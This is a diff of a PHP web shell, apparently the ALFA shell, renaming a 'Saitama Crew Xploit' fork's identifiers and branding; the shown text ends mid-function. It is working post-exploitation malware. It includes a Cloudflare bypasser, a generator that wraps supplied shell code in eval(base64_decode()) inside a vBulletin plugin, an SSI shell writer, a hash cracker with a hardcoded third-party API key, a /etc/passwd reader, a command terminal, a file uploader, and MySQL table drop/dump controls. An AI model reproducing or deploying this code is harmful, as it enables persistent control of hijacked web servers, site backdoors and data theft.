+@__write_file('alfa_ssi.shtml',__get_resource($code));
+@chmod("alfa_ssi.shtml",0755);
+echo AlfaiFrameCreator('alfa_shtml/alfa_ssi.shtml');
 echo '</div>';
-saitamafooter();
+alfafooter();
 }
-function saitamacloudflare(){
-saitamahead();
-saitamaNum(8,9,10,7,6,5,4,3);
+function alfacloudflare(){
+alfahead();
+AlfaNum(8,9,10,7,6,5,4,3);
 echo "<div class=header><center><br><div class='txtfont_header'>| Cloud Flare ByPasser |</div><br><form action='' onsubmit=\"g('cloudflare',null,this.url.value,'>>'); return false;\" method='post'>
 <p><div class='txtfont'>Target:</div> <input type='text' size=30 name='url' style='text-align:center;' placeholder=\"target.com\"> <input type='submit' name='go' value=' ' /></p></form></center>";
-if($_POST['saitama2'] && $_POST['saitama2'] == '>>'){
-$url = $_POST['saitama1'];
+if($_POST['alfa2'] && $_POST['alfa2'] == '>>'){
+$url = $_POST['alfa1'];
 if(!preg_match('/^(https?):\/\/(w{3}|w3)\./i', $url)){
 $url = preg_replace('/^(https?):\/\//', '', $url);
 $url = "http://www.".$url;
@@ -2187,7 +2188,7 @@ echo "Trying {$site}: {$ip}\n<br>";
 echo "\n[+] Finished.\n<br>";
 }
 echo '</div>';
-saitamafooter();
+alfafooter();
 }
 function is_ipv4($ip){
 return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) ? $ip : '(Null)';
@@ -2206,39 +2207,39 @@ echo "<tr><td><div class='tbltxt'>".$array['tdName']."</div></td><td><input type
 }
 echo '</table>';
 }
-function saitamaphp2xml(){
-saitamahead();
-saitamaNum(8,9,10,7,6,5,4,3);
+function alfaphp2xml(){
+alfahead();
+AlfaNum(8,9,10,7,6,5,4,3);
 echo "<div class=header><center><p><div class='txtfont_header'>| Shell For vBulletin |</div></p><form onsubmit=\"g('php2xml',null,this.code.value,'>>'); return false;\" method='post'>
 <p><br><textarea rows='12' cols='70' type='text' name='code' placeholder=\"insert your shell code\"></textarea><br/><br/>
 <input type='submit' name='go' value=' ' /></p></form></center>";
-if($_POST['saitama2']&&$_POST['saitama2']=='>>'){
+if($_POST['alfa2']&&$_POST['alfa2']=='>>'){
 echo __pre()."<p><center><textarea rows='10' name='users' cols='80'>";
-echo '<?xml version="1.0" encoding="ISO-8859-1"?><plugins><plugin active="1" product="vbulletin"><title>vBulletin</title><hookname>init_startup</hookname><phpcode><![CDATA[if (strpos($_SERVER[\'PHP_SELF\'],"subscriptions.php")){eval(base64_decode(\''.__ZW5jb2Rlcg($_POST['saitama1']).'\'));exit;}]]></phpcode></plugin></plugins>';
+echo '<?xml version="1.0" encoding="ISO-8859-1"?><plugins><plugin active="1" product="vbulletin"><title>vBulletin</title><hookname>init_startup</hookname><phpcode><![CDATA[if (strpos($_SERVER[\'PHP_SELF\'],"subscriptions.php")){eval(base64_decode(\''.__ZW5jb2Rlcg($_POST['alfa1']).'\'));exit;}]]></phpcode></plugin></plugins>';
 echo '</textarea></center></p>';
 }
 echo '</center></div>';
-saitamafooter();
+alfafooter();
 }
-function saitamacpcrack(){
-saitamahead();
+function alfacpcrack(){
+alfahead();
 echo '<div class=header><center><p><div class="txtfont_header">| Hash Tools |</div></p><h3><a href=javascript:void(0) onclick="g(\'cpcrack\',null,\'dec\')">| DeCrypter | </a><a href=javascript:void(0) onclick="g(\'cpcrack\',null,\'analyzer\')">| Hash Analyzer | </a></h3></center>';
-if($_POST['saitama1']=='dec'){
+if($_POST['alfa1']=='dec'){
 $algorithms = array('md5'=>'MD5','md4'=>'MD4','sha1'=>'SHA1','sha256'=>'SHA256','sha384'=>'SHA384','sha512'=>'SHA512','ntlm'=>'NTLM');
 echo '<center><div class="txtfont_header">| DeCrypter |</div><br><br>
 <form onsubmit="g(\'cpcrack\',null,\'dec\',this.md5.value,\'>>\',this.alg.value); return false;"><div class="txtfont">Decrypt Method:</div> <select name="alg" style="width:100px;">';
 foreach($algorithms as $key=>$val){echo('<option value="'.$key.'">'.$val.'</option>');}
 echo'</select><input type="text" placeholder="Hash" name="md5" size="60" id="text" /> <input type="submit" value=" " name="go" /></form></center><br>';
-if($_POST['saitama3'] == '>>'){
-$hash = $_POST['saitama2'];
+if($_POST['alfa3'] == '>>'){
+$hash = $_POST['alfa2'];
 if(!empty($hash)){
-$hash_type = $_POST['saitama4'];
+$hash_type = $_POST['alfa4'];
 $email = "solevisible@gmail.com";
 $code = "7b9fa79f92c3cd96";
 $target = "https://md5decrypt.net/Api/api.php?hash=".$hash."&hash_type=".$hash_type."&email=".$email."&code=".$code;
 $resp = @file_get_contents($target);
 if($resp==''){
-$get = new saitamaCURL();
+$get = new AlfaCURL();
 $resp = $get->Send($target);
 }
 echo __pre().'<center>';
@@ -2257,14 +2258,14 @@ echo('</center>');
 }
 }
 }
-if($_POST['saitama1']=='analyzer'){
+if($_POST['alfa1']=='analyzer'){
 echo '<center><p><div class="txtfont_header">| Hash Analyzer |</div></p>
 <form onsubmit="g(\'cpcrack\',null,\'analyzer\',this.hash.value,\'>>\');return false;">
 <div class="txtfont">Hash: </div> <input type="text" placeholder="Hash" name="hash" size="60" id="text" /> <input type="submit" value=" " name="go" /></form></center><br>';
-if($_POST['saitama3'] == '>>'){
-$hash = $_POST['saitama2'];
+if($_POST['alfa3'] == '>>'){
+$hash = $_POST['alfa2'];
 if(!empty($hash)){
-$curl = new saitamaCURL();
+$curl = new AlfaCURL();
 $resp = $curl->Send("https://md5decrypt.net/en/HashFinder/","post","hash={$hash}&crypt=Search");
 echo(__pre().'<center>');
 if(preg_match('#<fieldset class="trouve">(.*?)</fieldset>#',$resp,$s)){
@@ -2277,9 +2278,9 @@ echo('</center><br>');
 }
 }
 echo '</div>';
-saitamafooter();
+alfafooter();
 }
-function saitamafooter(){
+function alfafooter(){
 if(!isset($_POST['ajax'])){
 echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0' >
 <tr>
@@ -2293,16 +2294,16 @@ echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0
 <td colspan='2'><form onsubmit=\"editor(this.file.value,'view','','','','file');return false;\"><span><span class='footer_text'>Read File : </span></span><br><input class='foottable' type='text' name='file' value='/etc/passwd'> <input type='submit' value=' '></form></td>
 </tr>
 <tr>
-<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text'>Execute :</span><br><button onClick='saitamaOpenPhpTerminal();return false;' class='foottable saitama_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='http://solevisible.com/icons/menu/terminal.svg'> Terminal</button><br></form></td>
+<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text'>Execute :</span><br><button onClick='alfaOpenPhpTerminal();return false;' class='foottable alfa_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='http://solevisible.com/icons/menu/terminal.svg'> Terminal</button><br></form></td>
 </tr>
 <tr>
 <td colspan='4'><form onsubmit='u(this);return false;' name='footer_form' method='post' ENCTYPE='multipart/form-data'>
 <input type='hidden' name='a' value='FilesMAn'>
 <input type='hidden' name='c' value='" . $GLOBALS['cwd'] ."'>
 <input type='hidden' name='ajax' value='true'>
-<input type='hidden' name='saitama1' value='uploadFile'>
+<input type='hidden' name='alfa1' value='uploadFile'>
 <input type='hidden' name='charset' value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
-<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='saitama-copyright'><span class='copyright'>[ Saitama Crew Xploit &copy; 2021-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"Whatsapp: 0887436443323\");' style='color: #E91E63;text-decoration: none;'>Contact me !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>saitamacrewxploit[.]gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://www.youtube.com/@saitamacrewxploit2638'>@SaitamaCrewX</a></span></div></td>
+<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./AlfaTeam &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>solevisible[at]gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/solevisible'>@solevisible</a></span></div></td>
 </tr>
 </table>
 </div>
@@ -2323,15 +2324,15 @@ echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0
   <a target='_blank' href='' name='link'><img src=\"http://solevisible.com/icons/menu/link.svg\"> Open file directly</a>
   <a href='javascript:void(0);' name='download'><img src=\"http://solevisible.com/icons/menu/download2.svg\"> Download</a>
   <a href='' name='view'><img src=\"http://solevisible.com/icons/menu/view.svg\"> View</a>
-  <a href='javascript:void(0);' onclick='saitamaSyncMenuToOpt(this);' path='' fname='' name='view_archive'><img src=\"http://solevisible.com/icons/menu/view.svg\"> View Archive</a>
+  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='view_archive'><img src=\"http://solevisible.com/icons/menu/view.svg\"> View Archive</a>
   <a href='' name='edit'><img src=\"http://solevisible.com/icons/menu/edit.svg\"> Edit</a>
-  <a href='javascript:void(0);' onclick='saitamaPopupAction(this, \"move\");' ftype='' path='' fname='' href='' href='' name='move'><img src=\"http://solevisible.com/icons/menu/move.svg\"> Move</a>
-  <a href='javascript:void(0);' onclick='saitamaPopupAction(this, \"copy\");' ftype='' path='' fname='' href='' name='copy'><img src=\"http://solevisible.com/icons/menu/copy.svg\"> Copy</a>
-  <a href='javascript:void(0);' onclick='saitamaPopupAction(this, \"rename\");' ftype='' path='' fname='' name='rename'><img src=\"http://solevisible.com/icons/menu/rename.svg\">  Rename</a>
-  <a href='javascript:void(0);' onclick='saitamaPopupAction(this, \"modify\");' ftype='' path='' fname='' name='modify'><img src=\"http://solevisible.com/icons/menu/time.svg\">  Modify</a>
-  <a href='javascript:void(0);' onclick='saitamaPopupAction(this, \"permission\");' name='permission'><img src=\"http://solevisible.com/icons/menu/key.svg\"> Change Permissions</a>
-  <a href='javascript:void(0);' onclick='saitamaSyncMenuToOpt(this);' path='' fname='' name='compress'><img src=\"http://solevisible.com/icons/menu/resize.svg\"> Compress</a>
-  <a href='javascript:void(0);' onclick='saitamaSyncMenuToOpt(this);' path='' fname='' name='extract'><img src=\"http://solevisible.com/icons/menu/increase.svg\"> Extract</a>
+  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"move\");' ftype='' path='' fname='' href='' href='' name='move'><img src=\"http://solevisible.com/icons/menu/move.svg\"> Move</a>
+  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"copy\");' ftype='' path='' fname='' href='' name='copy'><img src=\"http://solevisible.com/icons/menu/copy.svg\"> Copy</a>
+  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"rename\");' ftype='' path='' fname='' name='rename'><img src=\"http://solevisible.com/icons/menu/rename.svg\">  Rename</a>
+  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"modify\");' ftype='' path='' fname='' name='modify'><img src=\"http://solevisible.com/icons/menu/time.svg\">  Modify</a>
+  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"permission\");' name='permission'><img src=\"http://solevisible.com/icons/menu/key.svg\"> Change Permissions</a>
+  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='compress'><img src=\"http://solevisible.com/icons/menu/resize.svg\"> Compress</a>
+  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='extract'><img src=\"http://solevisible.com/icons/menu/increase.svg\"> Extract</a>
   <a href='javascript:void(0);' name='delete'><img src=\"http://solevisible.com/icons/menu/delete.svg\"> Delete</a>
 </div>
 <div id=\"filesman-tab-full-path\"></div>
@@ -2383,13 +2384,13 @@ echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0
 
 			</form>
 		<div class='popup-foot'>
-			<button style='background: #2b5225;' name='accept' action='' onclick='saitamaPopUpDoAction(this);'></button>
+			<button style='background: #2b5225;' name='accept' action='' onclick='alfaPopUpDoAction(this);'></button>
 			<button style='background: #9e2c2c;' onclick='d.querySelector(\".cl-popup-fixed\").style.display=\"none\";'>Cancell</button>
 		</div>
 	</div>
 </div>";?>
 <script>
-function saitamaMysqlApi(e,t){var a={host:mysql_cache[e.db_id].host,user:mysql_cache[e.db_id].user,pass:mysql_cache[e.db_id].pass,db:e.db_target,db_id:e.db_id};if(e.hasOwnProperty("db_info"))for(var i in e.db_info)a[i]=e.db_info[i];var l={a:saitamab64("Sql_manager_api"),c_:saitamab64(c_),saitama1:saitamab64(JSON.stringify(a))};if(e.hasOwnProperty("post"))for(var i in e.post.hasOwnProperty("saitama2")&&"load_data"!=e.post.saitama2&&"page"!=e.post.saitama2&&"edit"!=e.post.saitama2&&"delete"!=e.post.saitama2&&(d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-pager").innerHTML="",d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-reporter").innerHTML=""),e.post)l[i]=saitamab64(e.post[i]);var r="";for(var o in l)r+=o+"="+l[o]+"&";saitamaloader(e.db_id,"block"),_Ajax(d.URL,r,function(a){saitamaloader(e.db_id,"none"),t(a)},!0,e.db_id)}function saitamaMysqlFilterTable(e,t){setTimeout(function(){var a="",i="",l=(a="","");if(null!=e)a=e.getAttribute("target"),i=e.getAttribute("db_id"),l=e.value;else a=t.target,i=t.db_id,l=t.value;l=new RegExp(l,"i"),d.querySelectorAll("#"+i+" "+a+" ul > li").forEach(function(e){var t=e.querySelector(".mysql_tables");if(null==t)return!1;-1==(t=t.innerText).search(l)?e.style.display="none":e.style.display="block"})},200)}function saitamaMysqlFilterAllTable(e,t){var a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" .mysql-tables input[name=filter_all]").value,l=d.querySelector("#"+a+" input[name=sql_count]").checked,r=[],o=[];if(d.querySelectorAll("#"+a+" .mysql-tables .list_container").forEach(function(e){var t=e.getAttribute("mode"),a=e.getAttribute("db_name");"no"==t&&r.push(a),o.push(a)}),r.length>0){if(0==i.length&&void 0===t)return!1;saitamaMysqlApi({db_id:a,db_target:r[0],ajax_id:"mysql_get_all_tables",db_info:{databases:r},post:{saitama2:"load_all_tables",saitama3:l}},function(r){if(0!=r.length){for(var o in r=JSON.parse(r)){var n=o,s=d.querySelector("#"+a+" .cls-"+n);saitamaMysqlMakeTblList(r[o],s,a,n,l)}void 0===t?saitamaMysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}):(e.setAttribute("mode","opened"),d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="http://solevisible.com/icons/menu/b_minus.png")}})}else if(void 0===t)for(var n in saitamaMysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}),o)saitamaMysqlTableMode(a,o[n],"closed");else{var s="",c=e.getAttribute("mode");for(var n in"opened"==c?(e.setAttribute("mode","closed"),s="b_plus.png"):(e.setAttribute("mode","opened"),s="b_minus.png"),o)saitamaMysqlTableMode(a,o[n],c);d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="http://solevisible.com/icons/menu/"+s}}function saitamaMysqlTableMode(e,t,a){var i=d.querySelector("#"+e+" .cls-"+t),l="";void 0===a?(l=-1!=i.classList.value.indexOf("hide-db-tables")?"b_minus.png":"b_plus.png",i.classList.toggle("hide-db-tables")):"opened"==a?(l="b_plus.png",i.classList.add("hide-db-tables")):(l="b_minus.png",i.classList.remove("hide-db-tables")),d.querySelector("#"+e+" .cls-"+t+"-expander img").src="http://solevisible.com/icons/menu/"+l}function saitamaMysqlExpander(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=e.getAttribute("sql_count"),l=d.querySelector("#"+a+" .cls-"+t);"loaded"==l.getAttribute("mode")?saitamaMysqlTableMode(a,t):saitamaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_get_tables",post:{saitama2:"load_tables",saitama3:i}},function(e){0!=e.length&&saitamaMysqlMakeTblList(e=JSON.parse(e),l,a,t,i)})}function saitamaMysqlTablesEvil(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i=e.getAttribute("mode");"checked"==i?(i=!1,e.setAttribute("mode","not")):(i=!0,e.setAttribute("mode","checked")),d.querySelectorAll("#"+a+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked=i})}function saitamaMysqlTablesDumpDrop(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i="none";"dump"==e.value&&(i="block"),d.querySelector("#"+a+" "+t+" .dump-file-holder").style.display=i}function saitamaMysqlTablesDumpDropBtn(e){var t=e.getAttribute("target"),a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=[],r=d.querySelector("#"+i+" input[name=sql_count]").checked,o=d.querySelector("#"+i+" "+t),n=o.querySelector("select[name=tables_evil]").value,s=o.querySelector(".dump-file-holder input").value;d.querySelectorAll("#"+i+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked&&l.push(e.value)}),l.length>0&&saitamaMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_query_evil",db_info:{tables:l,mode:n,dump_file:s},post:{saitama2:"dump_drop"}},function(e){0!=e.length&&(e=JSON.parse(e),"drop"==n?saitamaMysqlMakeTblList(e,o,i,a,r):o.querySelector(".dump-file-holder").insertAdjacentHTML("beforeend","<div><a href='javascript:void(0);' onclick='g(\"FilesTools\",null,\""+s+'","download");\'><span>Download: '+s+"</span></a></div>"))})}function saitamaMysqlMakeTblList(e,t,a,i,l){t.setAttribute("mode","loaded");var r='<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" db_id="'+a+'" placeholder="Filter Table" target=".cls-'+i+'" onkeyup="saitamaMysqlFilterTable(this);" name="filter"></div></li>';for(var o in e)null!=e[o]&&(r+="<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='"+e[o].name+"'>&nbsp;<a class='db-opt-id' db_target='"+i+"' db_id='"+a+"' href='javascript:void(0);' onclick=\"saitamaLoadTableData(this, '"+e[o].name+"')\"><span class='mysql_tables' style='font-weight:unset;'>"+e[o].name+"</span></a>"+(l?" <small><span style='font-weight:unset;' class='mysql_table_count'>("+e[o].count+")</span></small>":"&nbsp;")+"</div></li>");r+='</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="saitamaMysqlTablesEvil(this);" db_id="'+a+'" class="db-opt-id" target=".cls-'+i+'" type="checkbox" class="db-opt-id"><select onchange="saitamaMysqlTablesDumpDrop(this);" class="db-opt-id" db_id="'+a+'" target=".cls-'+i+'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="saitamaMysqlTablesDumpDropBtn(this);return false;" db_id="'+a+'" class="db-opt-id" db_target="'+i+'" target=".cls-'+i+'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>',t.innerHTML=r,d.querySelector("#"+a+" .cls-"+i+"-expander img").src="http://solevisible.com/icons/menu/b_minus.png"}function saitamaMysqlQuery(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" textarea[name=query]").value;saitamaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_load_query_data",db_info:{query:i},post:{saitama2:"query"}},function(e){0!=e.length&&(e=JSON.parse(e),saitamaMysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.status?e.table:"",saitamaMysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0))})}function saitamaMysqlReportBuilder(e,t){var a="";t.status||(a="<div><span>Error: </span><div style='padding-left: 50px;'><pre>"+t.error+"</pre></div></div>");var i="<div><span>Query:</span><div style='padding-left: 50px;'><pre>"+t.query+"</pre></div>"+a+"</div>";d.querySelector("#"+e+" .mysql-query-reporter").innerHTML=i}function saitamaMysqlTablePanelCtl(e){var t=e.getAttribute("db_id"),a=(t=e.getAttribute("db_id"),d.querySelector("#"+t)),i=a.querySelector(".tables-panel-ctl");"none"==i.getAttribute("mode")?(a.querySelector(".mysql-tables").style.display="block",i.setAttribute("mode","block"),i.innerHTML="&#x3C;&#x3C;",a.querySelector(".mysql-query-results-fixed").classList.remove("mysql-query-results-fixed")):(a.querySelector(".mysql-tables").style.display="none",i.setAttribute("mode","none"),i.innerHTML="&#x3E;&#x3E;",a.querySelector(".mysql-query-results").classList.add("mysql-query-results-fixed")),i.classList.toggle("tables-panel-ctl-min")}function saitamaMysqlTabCtl(e,t){var a=void 0===t?e.getAttribute("db_id"):e.db_id,i=void 0===t?e.getAttribute("target"):e.target;d.querySelectorAll("#"+a+" .mysql-query-content").forEach(function(e){e.classList.add("mysql-hide-content")}),d.querySelector("#"+a+" .mysql-query-result-tabs .mysql-query-selected-tab").classList.remove("mysql-query-selected-tab"),void 0===t?e.classList.add("mysql-query-selected-tab"):d.querySelector("#"+a+" .mysql-query-result-tabs div:nth-child("+e.child+")").classList.add("mysql-query-selected-tab"),d.querySelector("#"+a+" "+i).classList.remove("mysql-hide-content")}function saitamaLoadTableData(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id");saitamaMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_load_table_data",db_info:{table:t},post:{saitama2:"load_data"}},function(e){if(0!=e.length){e=JSON.parse(e);var l="",r="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#00ffff;'><th>Column</th><th>Type</th><th>Value</th></tr>",o="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#00ffff;'><th>Column</th><th>Type</th><th>Value</th><th>Change</th></tr>",n="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#00ffff;'><th>Column</th><th>Type</th><th>Collation</th><th>Operator</th><th>Value</th></tr>",s=["int","smallint","bigint","tinyint","mediumint"],c=["longtext","text","mediumtext","tinytext"];for(var u in e.columns){var p="text";-1!=s.indexOf(e.columns[u].data_type)&&(p="number"),n+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td>"+e.columns[u].type+"</td><td>"+e.columns[u].collation+"</td><td><select name='"+e.columns[u].name+"'><option value='='>=</option><option value='!='>!=</option><option value='>'>&gt;</option><option value='>='>&gt;=</option><option value='<'>&lt;</option><option value='<='>&lt;=</option><option value=\"= ''\">= ''</option><option value=\"!= ''\">!= ''</option><option value='LIKE'>LIKE</option><option value='LIKE %...%'>LIKE %...%</option><option value='NOT LIKE'>NOT LIKE</option><option value='REGEXP'>REGEXP</option><option value='REGEXP ^...$'>REGEXP ^...$</option><option value='NOT REGEXP'>NOT REGEXP</option><option value='IN (...)'>IN (...)</option><option value='NOT IN (...)'>NOT IN (...)</option><option value='BETWEEN'>BETWEEN</option><option value='NOT BETWEEN'>NOT BETWEEN</option><option value='IS NULL'>IS NULL</option><option value='IS NOT NULL'>IS NOT NULL</option></select></td><td><input type='"+p+"' name='"+e.columns[u].name+"'></td></tr>";var f=saitamaMysqlLoadDataType(e.columns[u].data_type);null==e.columns[u].type_value&&(e.columns[u].type_value=""),o+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td><select name='sel_"+e.columns[u].name+"'>"+f+"</select></td><td><input name='value_"+e.columns[u].name+"' type='text' value='"+(-1==c.indexOf(e.columns[u].data_type)?e.columns[u].type_value:"")+"'></td><td><button col_name='"+e.columns[u].name+"' tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='saitamaMysqlAlterTbl(this);return false;'>Change</button></td></tr>";var m="";switch(e.columns[u].data_type){case"longtext":case"text":m="<textarea name='"+e.columns[u].name+"' rows='5'></textarea>";break;case"int":case"smallint":case"bigint":m="<input type='number' name='"+e.columns[u].name+"' value=''>";break;default:m="<input type='text' name='"+e.columns[u].name+"' value=''>"}r+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td>"+e.columns[u].type+"</td><td>"+m+"</td></tr>"}if(r+="</table><div style='margin-left:20px;'><button tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='saitamaMysqlUpdateRow(this, \"insert\");return false;'>Insert</button></div><div class='mysql-insert-result'></div>",o+="</table><div class='mysql-structure-qres'></div>",n+="</table><div style='padding-left: 384px;margin-top: 15px;'><button tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='saitamaMysqlSearch(this);return false;'>Search</button></div>",e.pages>0){l+="<span style='cursor:pointer;' db_id='"+i+"' onclick='saitamaMysqlChangePage(this,1);'><<</span> <span> page: </span> <select tbl_name='"+t+"' db_target='"+a+"' name='mysql-q-pages' db_id='"+i+"' class='db-opt-id' onchange='saitamaMysqlChangePage(this);' pages='"+e.pages+"'>";for(var b=1;b<e.pages+1;b++)l+="<option>"+b+"</option>";l+="</select><span> Of "+e.pages+"</span> <span style='cursor:pointer;' db_id='"+i+"' onclick='saitamaMysqlChangePage(this,2);'>>></span>"}var y=d.querySelector("#"+i);y.querySelector(".mysql-search-area").innerHTML=n,y.querySelector(".mysql-insert-row").innerHTML=r,y.querySelector(".mysql-edit-row").innerHTML="",y.querySelector(".mysql-structure").innerHTML=o,y.querySelector(".mysql-query-result-header .mysql-query-pager").innerHTML=l,y.querySelector(".mysql-query-table").innerHTML=e.status?e.table:"",saitamaMysqlTabCtl({child:1,db_id:i,target:".mysql-query-result-content"},!0),d.querySelector("#"+i+" .mysql-query-result-tabs div:nth-child(6)").style.display="none",saitamaMysqlReportBuilder(i,e)}})}function saitamaMysqlAlterTbl(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a),l=e.getAttribute("tbl_name"),r=e.getAttribute("col_name"),o={};o.type=i.querySelector(".mysql-structure select[name=sel_"+r+"]").value,o.input=i.querySelector(".mysql-structure input[name=value_"+r+"]").value,saitamaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_table_alter",db_info:{table:l,column:r,alter:o},post:{saitama2:"alter"}},function(e){var t=d.querySelector("#"+a+" .mysql-structure-qres");t.innerHTML=e,t.style.display="block"})}function saitamaMysqlSearch(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a),l=e.getAttribute("tbl_name"),r={};i.querySelectorAll(".mysql-search-area input, .mysql-search-area select").forEach(function(e){r.hasOwnProperty(e.name)||(r[e.name]={}),"SELECT"==e.tagName?r[e.name].opt=e.value:r[e.name].value=e.value}),saitamaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_table_search_query",db_info:{table:l,search:r},post:{saitama2:"search"}},function(e){0!=e.length&&(e=JSON.parse(e),saitamaMysqlReportBuilder(a,e),saitamaMysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.table)})}function saitamaMysqlEditRow(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=(d.querySelector("#"+i),e.getAttribute("col_key")),r=e.getAttribute("key"),o=e.getAttribute("tbl_name"),n=e.getAttribute("row_id");saitamaMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_table_edit_query",db_info:{table:o,col_key:l,key:r},post:{saitama2:t}},function(e){if(0!=e.length)if(e=JSON.parse(e),"edit"==t){var s="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#00ffff;'><th>Column</th><th>Type</th><th>Value</th></tr>";for(var c in e){var u="";switch(e[c].type.tag){case"textarea":u="<textarea name='"+e[c].col+"' rows='5'>"+e[c].value+"</textarea>";break;case"input":u="<input type='"+e[c].type.type+"' name='"+e[c].col+"' value='"+e[c].value+"'>"}s+="<tr><th style='text-align: left;'>"+e[c].col+"</th><td>"+e[c].type.col_type+"</td><td>"+u+"</td></tr>"}s+="</table><div style='margin-left:20px;'><button col_key='"+l+"' key='"+r+"' tbl_name='"+o+"' db_id='"+i+"' db_target='"+a+"' onclick='saitamaMysqlUpdateRow(this, \"edit\");return false;'>Update</button></div><div class='mysql-update-result'></div>",d.querySelector("#"+i+" .mysql-edit-row").innerHTML=s,saitamaMysqlTabCtl({child:6,db_id:i,target:".mysql-edit-row"},!0),d.querySelector("#"+i+" .mysql-query-result-tabs div:nth-child(6)").style.display="inline-block"}else"delete"==t&&(e.status?d.querySelector("#"+i+" .tbl_row_l"+n).remove():alert(e.error))})}function saitamaMysqlTblSelectAll(e){var t=e.getAttribute("db_id");d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(t){t.checked=e.checked})}function saitamaMysqlDeleteAllSelectedrows(e){var t=e.getAttribute("db_id"),a=e.getAttribute("db_target"),i=e.getAttribute("col_key"),l=e.getAttribute("tbl_name"),r=[];if(d.querySelectorAll("#"+t+" .mysql-main 